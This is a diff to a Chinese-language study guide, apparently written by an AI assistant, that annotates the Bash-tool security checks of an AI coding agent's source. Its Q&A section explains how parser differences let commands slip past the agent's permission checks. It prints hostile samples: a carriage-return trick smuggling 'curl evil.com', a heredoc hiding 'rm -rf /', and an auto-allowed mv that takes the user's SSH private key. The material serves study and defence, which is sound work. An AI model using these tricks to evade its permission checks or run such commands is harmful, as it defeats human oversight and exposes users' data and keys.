@@ -84,7 +84,7 @@ process.env.COREPACK_ENABLE_AUTO_PIN = '0';
 | **第 2 步** 读一个最小模块（1 小时） | `src/commands/clear/index.ts`（19 行） | [`src/commands/clear/index.ts`](annotated/src/commands/clear/index.ts) | ✅ 完成 |
 | | `src/tools/BashTool/commandSemantics.ts`（141 行） | [`src/tools/BashTool/commandSemantics.ts`](annotated/src/tools/BashTool/commandSemantics.ts) | ✅ 完成 |
 | **第 3 步** 读初始化流程（2 小时） | `src/setup.ts`（477 行） | [`src/setup.ts`](annotated/src/setup.ts) | ✅ 完成 |
-| **第 4 步** 读工具系统（半天）★ | `src/Tool.ts`、`src/tools.ts`、`BashTool/` | [`Tool.ts`](annotated/src/Tool.ts) ✅<br>[`tools.ts`](annotated/src/tools.ts) ✅<br>[`BashTool.tsx`](annotated/src/tools/BashTool/BashTool.tsx) ✅<br>`bashSecurity`／`bashPermissions` ⬜ | 🚧 主体完成 |
+| **第 4 步** 读工具系统（半天）★ | `src/Tool.ts`、`src/tools.ts`、`BashTool/` | [`Tool.ts`](annotated/src/Tool.ts) ✅<br>[`tools.ts`](annotated/src/tools.ts) ✅<br>[`BashTool.tsx`](annotated/src/tools/BashTool/BashTool.tsx) ✅<br>[`bashSecurity.ts`](annotated/src/tools/BashTool/bashSecurity.ts) ✅<br>`bashPermissions` ⬜ | 🚧 主体完成 |
 | **第 5 步** 读主循环（1 天）★★ | `src/constants/prompts.ts`、`src/query.ts`、`src/QueryEngine.ts`、`src/services/api/` | — | ⬜ 待做 |
 | **第 6 步** 读服务层（半天） | `src/services/` 各模块 | — | ⬜ 待做 |
 | **第 7 步** UI 与多智能体（可选） | `src/components/`、`src/ink/`、`src/coordinator/` | — | ⬜ 待做 |
@@ -368,17 +368,66 @@ if (!tool.isConcurrencySafe && contextModifiers.length > 0) {
 
 ---
 
+## 第 4 步 · `bashSecurity.ts`（2,592 行）读完了吗？四个自测问题
+
+<details>
+<summary>点开看四个问题</summary>
+
+**1. `earlyValidators` 里三个 validator 明明返回 `allow`，为什么调用方要把它降级成 `passthrough`？**
+
+因为本函数的结论会被 `bashPermissions` 当成"安全许可"。如果它能返回 allow，那么一个误判就等于**一次自动执行**（跳过规则匹配、分类器、用户确认）。降级成 passthrough 的语义是"我这关没意见，请继续走正常权限流程"——安全检查的能力被限制成**只能否决、不能批准**。副作用：`updatedInput` 变成没人读的死数据。
+
+**2. `nonMisparsingValidators` 只有两个成员。`validateCarriageReturn` 为什么刻意不在里面？**
+
+CR 是**解析器打架**：JS 的 `\s` 包含 `\r`，bash 的 IFS 不含。所以 `TZ=UTC\recho curl evil.com` 在 validator 眼里是 `echo curl evil.com`（命中 `Bash(echo:*)` 允许规则），在 bash 眼里是 `curl evil.com`。放进 `nonMisparsingValidators` 就意味着它的 ask 只值"问一声"、用户可能点允许——而"解析器不可信"的命令不允许被允许。
+
+**3. `isSafeHeredoc` 为什么必须逐行找闭合分隔符，不能用 `[\s\S]*?`？**
+
+懒惰匹配会跳过第一个 `DELIM` 去找后面的 `DELIM)`，把中间的命令当成 body。而 bash 在**第一个**匹配行就闭合了。样本：
+
+```
+$(cat <<'EOF'
+data
+EOF
+; rm -rf /
+EOF)
+```
+
+`[\s\S]*?` 认为 body 是 `data\nEOF\n; rm -rf /`，全在 heredoc 里；bash 在第 3 行闭合，`rm -rf /` 是真命令。
+
+**4. 一条命令过了 `bashToolHasPermission`，但它不是"绝对安全"，只是"权限判定通过了"。为什么这个区别在 `BashTool` 里很要紧？**
+
+因为 `bashSecurity` 只回答"我能不能信任我对这条命令的解析"。它**不知道**用户配了什么规则、当前是什么模式、沙箱是否开启。真正的放行是后面的事，而且可能是自动放行（acceptEdits 模式下全 cwd 路径的 `mv`）。所以"安全检测通过"绝不等于"这条命令无害"——`mv ./decoy '<\n>#' ~/.ssh/id_rsa ./exfil` 就是安全检测通过、权限判定自动允许、然后私钥被移走的例子。
+
+</details>
+
+<details>
+<summary>点开看五个读源码才看得出的问题</summary>
+
+1. **两个 `_DEPRECATED` 函数有 80% 是逐字重复** —— 两个前置检查、earlyValidators 循环、19 个 validator 数组、defer 循环全部复制粘贴。改一处必须改两处，漏改不报错，只让两条路径行为不一致。判断走哪条：调用者是 async 就走 async 那个。没有任何机制能发现这种同源分歧。
+
+2. **heredoc 解析做了两遍** —— `isSafeHeredoc`（判安全）用 `line === delimiter`，`stripSafeHeredocSubstitutions`（只剥离）用 `line.startsWith(delimiter)`。同一条命令可能在一个函数里"不安全"、在另一个里"可剥离"。
+
+3. **`UNICODE_WS_RE` 的清单不完整** —— 区间到 `\u200A` 为止，所以 `\u200B`（零宽空格）、`\u200C`/`\u200D`（ZWNJ/ZWJ）都不在检测范围内。但这**不构成漏洞**：这三个字符既不是 bash 的 IFS 成员，也不是 JS 的 `\s`，两个解析器都不当分隔符，没有差异可用。知道清单不完整、也知道为什么不完整，比盲目相信清单有用。
+
+4. **`ZSH_DANGEROUS_COMMANDS` 里混了一个非命令** —— `mapfile` 不是可执行命令，是 `zmodload zsh/mapfile` 之后拿到的关联数组（赋值即写文件）。放进"base command 黑名单"里永远匹配不到。它的实际作用是**写给下一位维护者的备注**。
+
+5. **`validateEmpty` 的 allow 消息用户永远看不到** —— "Empty command is safe" 被降级成 passthrough 的 message，而 passthrough 在最终返回时又被覆盖成 "Command passed all security checks"。空命令这个结论在任何日志里都不存在。
+
+</details>
+
+---
+
 ## 继续往下读之前
 
-第 4 步还剩两个大文件没批注，都不小：
+第 4 步只剩最后一个文件：[`src/tools/BashTool/bashPermissions.ts`](source/src/tools/BashTool/bashPermissions.ts) —— 2,621 行，`bashToolHasPermission` 就在这儿。
 
-- [`src/tools/BashTool/bashSecurity.ts`](source/src/tools/BashTool/bashSecurity.ts) —— 2,592 行，危险命令识别
-- [`src/tools/BashTool/bashPermissions.ts`](source/src/tools/BashTool/bashPermissions.ts) —— 2,621 行，权限判定（`bashToolHasPermission` 就在这儿）
+它和刚读完的 `bashSecurity.ts` 分工很清楚：**`bashSecurity` 回答"这条命令能不能被信任地解析"，`bashPermissions` 回答"这条命令要不要放行"**。后者会用到前者的结论（第 2085-2107 行那个 misparsing 闸门），再叠上规则匹配、沙箱判定、分类器、用户确认。
 
 `BashTool.tsx` 里 `checkPermissions` 那一行只做转发，真正的判定全在这两个文件里。想彻底搞懂"AI 怎么安全地跑命令"，这两个必须读。
 
 再往下是第 5 步（主循环）：`constants/prompts.ts`、`query.ts`、`QueryEngine.ts`、`services/api/`。
 
-告诉我「继续第 4 步剩下两个」或「继续第 5 步」，我就接着批注。
+告诉我「继续 bashPermissions」或「继续第 5 步」，我就接着批注。
 
 
